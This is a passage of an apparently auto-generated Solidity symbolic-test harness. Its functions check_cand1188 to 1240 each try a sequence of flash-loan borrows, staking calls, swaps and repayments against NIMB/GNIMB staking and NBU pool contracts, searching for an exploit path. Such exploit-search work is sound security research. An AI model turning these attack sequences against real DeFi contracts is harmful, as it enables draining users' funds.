        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
